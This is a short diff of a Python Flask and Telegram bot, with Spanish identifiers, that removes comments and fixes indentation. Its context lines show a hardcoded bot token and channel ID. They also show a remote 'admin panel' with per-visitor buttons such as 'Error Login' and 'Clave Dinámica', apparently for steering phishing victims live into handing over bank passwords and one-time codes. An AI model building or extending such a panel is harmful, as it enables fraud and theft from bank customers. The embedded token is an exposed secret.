@@ -9,23 +9,20 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 logging.basicConfig(level=logging.INFO)
 
-# Obtener variables (usará los valores por defecto o las variables de entorno de Render)
 TOKEN = os.environ.get("BOT_TOKEN", "8371195355:AAFa7xJjZJeO9JxlbgEE0eHXB3vPa8fHMo0")
 CANAL_ADMIN_ID = int(os.environ.get("CANAL_ADMIN_ID", "-1003904819480"))
 
-# Inicializar Flask y CORS (Una sola vez)
 app = Flask(__name__, static_folder='.', static_url_path='')
 CORS(app)
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
-# Diccionario en memoria para el seguimiento de estados por ID de usuario
 user_states = {}
 
 
 def crear_teclado_admin(user_id):
     """Genera la botonera remota de 10 opciones para el panel de administración en Telegram."""
-     markup = InlineKeyboardMarkup(row_width=2)
+    markup = InlineKeyboardMarkup(row_width=2)
     btn_opt1 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:A:{user_id}")
     btn_opt2 = InlineKeyboardButton("Clave Dinámica", callback_data=f"admin:B:{user_id}")
     btn_opt3 = InlineKeyboardButton("❌ Error Dinámica", callback_data=f"admin:C:{user_id}")
@@ -38,7 +35,6 @@ def crear_teclado_admin(user_id):
     btn_opt10 = InlineKeyboardButton("finalizar", callback_data=f"admin:J:{user_id}")
     markup.add(btn_opt1, btn_opt2, btn_opt3, btn_opt4, btn_opt5, btn_opt6, btn_opt7, btn_opt8, btn_opt9, btn_opt10)
     return markup
-
 
 
 @app.route('/', methods=['GET'])
@@ -141,7 +137,7 @@ def iniciar_bot():
     except Exception as e:
         print(f"❌ Error en el loop del bot: {e}")
 
-# Se inicia el hilo del bot al cargar el módulo (compatible con Gunicorn en Render)
+
 threading.Thread(target=iniciar_bot, daemon=True).start()
 
 if __name__ == "__main__":
